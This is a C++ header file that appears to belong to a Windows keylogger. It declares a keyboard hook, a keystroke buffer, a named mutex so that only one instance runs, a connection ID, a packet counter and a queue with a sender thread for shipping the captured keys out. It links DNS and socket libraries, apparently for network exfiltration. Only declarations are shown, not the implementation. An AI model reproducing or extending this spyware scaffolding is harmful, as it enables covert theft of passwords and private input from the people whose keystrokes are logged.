#pragma once
#define WIN32_LEAN_AND_MEAN

#include <string>
#include <windows.h>
#include <queue>
#include <mutex>

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib")

#define MAX_BUFFER 10

inline LPCWSTR     MUTEX_NAME        = L"e3a8bdf7-1c29-4f7b-a0d2-c3f5e9b08a14";
inline HHOOK       _k_hook           = nullptr;
inline HKL         keyboardLayout    = nullptr;
inline std::string keystrokeBuffer   = "";

inline int         connectionId      = -1;
inline int         keylog_packetNumber = 0;  // Separate packet counter for keylogger

inline std::queue<std::string> sendQueue;
inline std::mutex queueMutex;
inline bool shouldStopSender = false;

LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam);

DWORD WINAPI senderThread(LPVOID lpParam);
